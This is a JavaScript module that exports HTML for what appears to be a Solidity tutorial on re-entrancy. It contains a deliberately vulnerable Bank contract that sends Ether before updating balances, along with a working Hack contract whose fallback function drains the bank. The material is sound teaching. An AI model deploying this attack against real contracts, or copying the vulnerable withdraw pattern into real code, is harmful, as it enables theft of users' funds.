const html = `<p>Here is the setup. Contract <code>A</code> calls contract <code>B</code>.</p>
<p>The <code>re-entracy</code> exploit allows <code>B</code> to call back into <code>A</code> before <code>A</code> finishes
it&#39;s execution.</p>
<pre><code class="language-solidity">pragma solidity ^0.5.16;

// Bank is a contract vulnerable to re-entrancy attack. Let&#39;s see why.
// To illustrate this attack, we will use 2 accounts.
// First account - Innocent user
// Second account - Attacker

contract Bank {
    mapping(address =&gt; uint) public balances;

    // Using the first account, deposit 1 Ether in to this contract
    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw(uint amount) public {
        if(balances[msg.sender] &gt;= amount) {
            // Send Ether
            (bool sent, ) = msg.sender.call.value(amount)("");
            // Throw an error if send fails.
            require(sent, "Failed to send ether");

            balances[msg.sender] -= amount;
        }
    }

    // Helper function to check the total Ether stored in this contract
    function getTotalBalance() public view returns (uint) {
        return address(this).balance;
    }
}

contract Hack {
    Bank public bank;

    constructor(Bank _bank) public {
        bank = _bank;
    }

    // This fallback is called when the Bank contract sends Ether to this contract.
    function () external payable {
        if (address(bank).balance &gt;= msg.value) {
            bank.withdraw(msg.value);
        }
    }

    // Try:
    // Using the second account, call this function sending 1 Ether.
    function attack() public payable {
        bank.deposit.value(msg.value)();
        bank.withdraw(msg.value);
        // This contract should now have 2 Ethers:
        // 1 Ether stolen from the first account and
        // 1 Ether returned to this contract.
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}
</code></pre>
`

export default html
